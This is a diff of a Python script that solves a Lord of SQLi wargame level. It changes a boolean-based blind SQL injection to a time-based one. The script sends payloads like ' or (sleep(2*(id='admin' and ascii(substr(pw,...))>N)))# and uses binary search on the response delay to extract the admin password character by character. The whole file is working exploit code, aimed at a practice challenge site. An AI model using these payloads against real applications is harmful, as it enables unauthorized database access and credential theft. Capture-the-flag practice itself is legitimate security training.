@@ -1,29 +1,22 @@
 #!/usr/bin/env python
 
-import urllib
-import urllib2
+import requests
 import sys
 
-URL = "https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php"
+URL = "https://los.rubiya.kr/chall/blue_dragon_23f2e3c81dca66e496c7de2d63b82984.php"
 UA =  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.90 Safari/537.36"
-Cookie = "PHPSESSID=9i2i63lhcv8dc6ge2k4pbijlgm"
+PHPSESSID="6a6k2j9arcl8e1bbe36q4u6670"
 
 
-def query(Q):
-    # print urllib.quote(Q)
-    UURL = URL + "?pw=" + urllib.quote(Q)
-    req = urllib2.Request(UURL, {}, {
-        'User-Agent': UA,
-        'Cookie': Cookie
-    })
+def query(params):
+    headers = {
+        'User-Agent': UA
+    }
+    cookies = {'PHPSESSID': PHPSESSID}
+    res = requests.get(URL, headers=headers, cookies=cookies, params=params)
+    print res.elapsed.seconds
+    return res.elapsed.seconds >= 2
 
-    res = urllib2.urlopen(req)
-    text = res.read()
-    if "location.href" in text:
-        print "Session expired..."
-        sys.exit()
-        
-    return "<h2>Hello admin</h2>" in text
 
 def find_length():
     left = 0
@@ -31,7 +24,10 @@ def find_length():
     while left < right:
         mid = (left+right)//2
         print "Finding... {} {} {}".format(left, mid, right)
-        if query("' or id='admin' and length(pw) > {}-- ".format(mid)):
+        if query({
+            'id': "' or (sleep(2*(id='admin' and length(pw)>{})))#".format(mid),
+            'pw': ''
+        }):
             left = mid+1
         else:
             right = mid
@@ -44,7 +40,10 @@ def find_ch(pos):
     while left < right:
         mid = (left+right)//2
         print "Finding... {} {} {}".format(left, mid, right)
-        if query("' or id='admin' and ord(substr(pw,{},1)) > {}-- ".format(pos, mid)):
+        if query({
+            'id': "' or (sleep(2*(id='admin' and ascii(substr(pw,{},1))>{})))#".format(pos, mid),
+            'pw': ''
+        }):
             left = mid+1
         else:
             right = mid
